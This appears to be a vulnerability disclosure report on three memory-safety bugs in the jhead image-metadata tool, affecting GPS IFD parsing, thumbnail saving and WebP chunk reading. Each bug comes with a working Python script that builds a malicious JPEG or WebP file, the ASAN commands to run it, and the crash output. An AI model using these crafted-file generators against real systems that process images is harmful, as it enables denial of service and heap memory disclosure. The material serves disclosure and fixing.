# jhead Vulnerabilities

## Bug1: GPS IFD Unchecked Component-Count Loop OOB Read in WebP EXIF

In `ProcessGpsInfo()` (gpsinfo.c:141-155), the loop that reads GPS latitude/longitude rational components always iterates three times regardless of the actual `Components` count in the IFD entry, so when `Components=1` and `OffsetVal=ExifLength-8` the bounds check passes but the loop reads up to 16 bytes beyond the end of the heap-allocated EXIF buffer, causing a heap out-of-bounds read.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def build_webp():
    GPS_IFD_OFFSET  = 26
    RATIONAL_OFFSET = 44
    EXIF_TOTAL      = 52

    tiff_hdr = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)

    ifd0  = struct.pack('<H', 1)
    ifd0 += struct.pack('<HHII', 0x8825, 4, 1, GPS_IFD_OFFSET)
    ifd0 += struct.pack('<I', 0)

    gps_ifd  = struct.pack('<H', 1)
    gps_ifd += struct.pack('<HHII', 0x0002, 5, 1, RATIONAL_OFFSET)
    gps_ifd += struct.pack('<I', 0)

    rational = struct.pack('<II', 45, 1)

    exif_data = tiff_hdr + ifd0 + gps_ifd + rational
    assert len(exif_data) == EXIF_TOTAL

    vp8x_payload = bytes([
        0x08,
        0x00, 0x00, 0x00,
        0x00, 0x00, 0x00,
        0x00, 0x00, 0x00,
    ])

    riff_file_size = 4 + 18 + 60

    riff_hdr  = b'RIFF' + struct.pack('<I', riff_file_size) + b'WEBP'
    vp8x_chunk = b'VP8X' + struct.pack('<I', 10) + vp8x_payload
    exif_chunk = b'EXIF' + struct.pack('<I', EXIF_TOTAL) + exif_data

    return riff_hdr + vp8x_chunk + exif_chunk

webp = build_webp()
with open('poc_input.jpg', 'wb') as f:
    f.write(webp)
print(f"[+] Created poc_input.jpg ({len(webp)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/jhead poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50600000005b at pc 0x562161c88471 bp 0x7fff7f040120 sp 0x7fff7f040110
READ of size 1 at 0x50600000005b thread T0
    #0 0x562161c88470 in Get32s (jhead+0x67470)
    #1 0x562161c963e4 in ProcessGpsInfo (jhead+0x753e4)

### Impact

An attacker can trigger a heap out-of-bounds read of up to 16 bytes past a malloc'd EXIF buffer, causing a denial-of-service crash under ASAN or in production when the read crosses a page boundary. The read may also disclose heap metadata or contents of adjacent allocations to an attacker who can observe program output or error messages. This vulnerability is exposed by any invocation of jhead on an untrusted WebP file containing a crafted GPS IFD entry and requires no special privileges or command-line flags.

<!-- REPORT_SOURCE: jhead_c#001 -->
<!-- DEDUP: ProcessGpsInfo::CWE-125 -->

## Bug2: SaveImgThumbnail Heap OOB Read via Negative ThumbnailSize Sign Error

In `SaveImgThumbnail()` in `imgfile.c`, the `ImageInfo.ThumbnailSize` field (declared as `int`) is assigned the value `-1` from a crafted EXIF `TAG_THUMBNAIL_LENGTH` of `0xFFFFFFFF` because the signed bounds check at `exif.c:982` and the zero guard at `imgfile.c:334` both fail to reject the negative value, and the subsequent `fwrite` at `imgfile.c:365` silently converts `-1` to `SIZE_MAX` as a `size_t` argument, producing a massive heap out-of-bounds read.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import os

OUT_FILE = "poc_input.jpg"

TAG_IMAGE_WIDTH      = 0x0100
TAG_THUMBNAIL_OFFSET = 0x0201
TAG_THUMBNAIL_LENGTH = 0x0202
FMT_ULONG            = 4

IFD0_OFFSET      = 8
IFD0_NUM_ENTRIES = 1
IFD1_OFFSET      = IFD0_OFFSET + 2 + IFD0_NUM_ENTRIES * 12 + 4  # = 26

THUMBNAIL_OFFSET_VALUE = 8
THUMBNAIL_LENGTH_VALUE = 0xFFFFFFFF

def ifd_entry(tag, fmt, count, value):
    return struct.pack('<HHII', tag, fmt, count, value)

# TIFF header (little-endian)
tiff  = struct.pack('<2sHI', b'II', 42, IFD0_OFFSET)
# IFD0
tiff += struct.pack('<H', IFD0_NUM_ENTRIES)
tiff += ifd_entry(TAG_IMAGE_WIDTH, FMT_ULONG, 1, 100)
tiff += struct.pack('<I', IFD1_OFFSET)
# IFD1
tiff += struct.pack('<H', 2)
tiff += ifd_entry(TAG_THUMBNAIL_OFFSET, FMT_ULONG, 1, THUMBNAIL_OFFSET_VALUE)
tiff += ifd_entry(TAG_THUMBNAIL_LENGTH, FMT_ULONG, 1, THUMBNAIL_LENGTH_VALUE)
tiff += struct.pack('<I', 0)

exif_magic  = b'Exif\x00\x00'
app1_body   = exif_magic + tiff
app1_length = 2 + len(app1_body)
app1        = b'\xFF\xE1' + struct.pack('>H', app1_length) + app1_body

sos_header      = b'\x01\x01\x00\x00\x3F\x00'
sos_length      = 2 + len(sos_header)
sos             = b'\xFF\xDA' + struct.pack('>H', sos_length) + sos_header
compressed_stub = b'\x00' * 16

jpeg = b'\xFF\xD8' + app1 + sos + compressed_stub + b'\xFF\xD9'

with open(OUT_FILE, 'wb') as f:
    f.write(jpeg)

print(f"[+] Written {len(jpeg)} bytes to {OUT_FILE}")
print(f"    TAG_THUMBNAIL_LENGTH = 0x{THUMBNAIL_LENGTH_VALUE:x} -> signed int -1 -> size_t SIZE_MAX")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/jhead -st poc_thumb.jpg poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** runtime error: left shift of negative value -1 (exif.c:344, triggered while reading crafted TAG_THUMBNAIL_LENGTH = 0xFFFFFFFF through Get32s). SaveImgThumbnail is called with ThumbnailSize = -1 and executes fwrite(ThumbnailPointer, SIZE_MAX, 1, file), confirmed by the output line "Created: 'poc_thumb.jpg'" appearing after the UBSan error.

### Impact

An attacker who supplies a crafted JPEG file with a malicious `TAG_THUMBNAIL_LENGTH` value of `0xFFFFFFFF` in the EXIF IFD1 can cause `fwrite` in `SaveImgThumbnail()` to request a read of `SIZE_MAX` bytes from the heap, constituting an unbounded heap out-of-bounds read that exposes all readable heap memory (including heap pointers, function pointers, and sensitive in-memory data) to the output thumbnail file and can be used to defeat ASLR. The vulnerability is triggered by any invocation of `jhead -st` on an untrusted JPEG file, making it exploitable whenever jhead processes attacker-controlled input, with a denial-of-service crash (SIGSEGV on unmapped pages) as an additional consequence on platforms where the glibc SIZE_MAX ssize_t conversion does not silently suppress the write.

<!-- REPORT_SOURCE: imgfile_c#001 -->
<!-- DEDUP: SaveImgThumbnail::CWE-190 -->

## Bug3: NULL Pointer Dereference via Unchecked malloc Return in ReadWebpSections

In `ReadWebpSections()` in `webpfile.c` (lines 99-104), the chunk length field is padded to compute `ReadLen = (ChunkLen + 1) & ~1` and passed directly to `malloc` without checking the return value, allowing a crafted chunk length of `0x7FFFFFFF` to produce a 2 GB allocation request that fails and returns NULL, after which `fread(NULL, 1, ReadLen, infile)` dereferences the null pointer and causes a segmentation fault.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator: NULL Pointer Dereference via Unchecked malloc in ReadWebpSections
CWE-476

Trigger: ReadWebpSections() reads a chunk length of 0x7FFFFFFF.
  ReadLen = (0x7FFFFFFF + 1) & ~1 = 0x80000000  (2 GB)
  malloc(0x80000000) returns NULL (forced via ASAN max_allocation_size_mb=512)
  fread(NULL, 1, ReadLen, infile) -> SIGSEGV
"""
import struct

OUT = "poc_input.jpg"

# Malicious chunk: FourCC "EXIF", length = 0x7FFFFFFF
# Guard: if ((int)ChunkLen <= 0) continue
#   (int)0x7FFFFFFF = 2147483647 > 0  =>  passes the guard
# ReadLen = (0x7FFFFFFF + 1) & ~1 = 0x80000000 = 2 GB
# With ASAN max_allocation_size_mb=512, malloc(2 GB) returns NULL.
# fread(NULL, 1, 2 GB, infile) attempts memcpy into NULL => SIGSEGV.
chunk_fourcc = b"EXIF"
chunk_len = 0x7FFFFFFF

# 32 bytes of padding after the chunk header so the file is NOT at EOF
# when fread(NULL,...) is called; glibc will try to copy data into the
# NULL buffer and fault instead of returning 0 on immediate EOF.
chunk_data_pad = b"\xde\xad\xbe\xef" * 8

chunk_header = chunk_fourcc + struct.pack("<I", chunk_len)

# RIFF payload: "WEBP" + malicious chunk header + padding
riff_payload = b"WEBP" + chunk_header + chunk_data_pad

# Full RIFF file
payload = b"RIFF" + struct.pack("<I", len(riff_payload)) + riff_payload

with open(OUT, "wb") as f:
    f.write(payload)

print(f"[+] Written {len(payload)} bytes to {OUT}")
print(f"[+] Chunk '{chunk_fourcc.decode()}' length field = 0x{chunk_len:08X}")
print(f"[+] Expected: malloc(0x80000000) returns NULL -> fread(NULL,...) -> SIGSEGV")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:allocator_may_return_null=1:max_allocation_size_mb=512" ./build_test/jhead poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer:DEADLYSIGNAL
WARNING: AddressSanitizer failed to allocate 0x80000000 bytes
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7ff1f00ea923 bp 0x000000000020 sp 0x7fff07e662a8 T0)
SUMMARY: AddressSanitizer: SEGV (/lib/x86_64-linux-gnu/libc.so.6+0x1a6923)

### Impact

An attacker who can supply a crafted JPEG or WebP file to jhead can trigger a null pointer dereference in `ReadWebpSections()`, crashing the process with SIGSEGV and causing a denial of service. Any invocation of jhead on an untrusted image file is affected, including automated pipelines that batch-process user-uploaded images. Because the crash occurs unconditionally whenever a chunk length of `0x7FFFFFFF` is encountered, it provides a reliable mechanism for service disruption in environments where jhead processes untrusted input.

<!-- REPORT_SOURCE: webpfile_c#001 -->
<!-- DEDUP: ReadWebpSections::CWE-476 -->
